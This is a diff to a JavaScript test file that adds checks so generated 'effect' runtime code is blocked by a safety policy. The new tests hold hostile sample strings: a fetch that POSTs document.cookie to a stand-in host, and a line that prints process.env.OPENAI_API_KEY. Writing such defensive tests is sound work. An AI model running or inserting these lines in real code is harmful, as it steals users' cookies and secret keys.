@@ -8,7 +8,8 @@ import {
   fetchPendingEffect,
   fetchApprovedEffects,
   generateEffectIdea,
-  submitEffectIdea
+  submitEffectIdea,
+  validateGeneratedRuntimeCode
 } from "./effectIdeas";
 
 describe("effect ideas client", () => {
@@ -147,6 +148,16 @@ describe("effect ideas client", () => {
     const effect = compileRuntimeEffect("return {\\n  render(context) {\\n    context.ctx.fillRect(0, 0, context.width, context.height);\\n  },\\n  reset() {}\\n};");
     expect(typeof effect.render).toBe("function");
     expect(typeof effect.reset).toBe("function");
+  });
+
+  it("rejects runtime code that attempts data exfiltration", () => {
+    expect(() => validateGeneratedRuntimeCode("return { render() { fetch('https://evil.invalid/leak', { method: 'POST', body: document.cookie }); } };"))
+      .toThrow("Generated runtime code blocked by safety policy");
+  });
+
+  it("rejects runtime code that reads process environment variables", () => {
+    expect(() => compileRuntimeEffect("return { render() { console.log(process.env.OPENAI_API_KEY); } };"))
+      .toThrow("Generated runtime code blocked by safety policy");
   });
 
   it("surfaces API error messages for generation failures", async () => {
